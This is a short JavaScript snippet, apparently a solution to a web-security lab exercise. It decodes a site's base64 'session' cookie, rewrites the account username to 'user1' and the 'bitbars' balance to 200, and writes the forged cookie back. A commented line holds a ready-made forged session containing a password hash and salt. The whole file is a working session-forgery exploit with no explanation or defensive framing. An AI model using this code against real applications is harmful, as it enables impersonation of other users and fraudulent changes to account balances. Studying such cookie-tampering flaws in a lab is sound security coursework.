function getCookie(key) {
  var value = "; " + document.cookie;
  var parts = value.split("; " + key + "=");
  if (parts.length == 2) return parts.pop().split(";").shift();
};

var session = getCookie('session');

var plain_session = JSON.parse(atob(session));
plain_session.account.username = 'user1';
plain_session.account.bitbars = '200';

var mysession = btoa(JSON.stringify(plain_session));


var mycookie = (document.cookie.replace(session, mysession));
document.cookie = mycookie;



// var mysession = "eyJsb2dnZWRJbiI6dHJ1ZSwiYWNjb3VudCI6eyJ1c2VybmFtZSI6InVzZXIxIiwiaGFzaGVkUGFzc3dvcmQiOiIwZmM5MjFkY2NmY2IwNzExMzJlNzIzODVmMTBkOTFkY2IyMTM5ODM3OTJkZmU5M2RlOGI1ZDMyNzRiNWE1Y2Y1Iiwic2FsdCI6IjIxODM0NzA4NDkyOTcwODYwMzY4OTQwNzEwMTMxNTYwMjE4NzQxIiwicHJvZmlsZSI6IiIsImJpdGJhcnMiOjIwMH19DQo=";

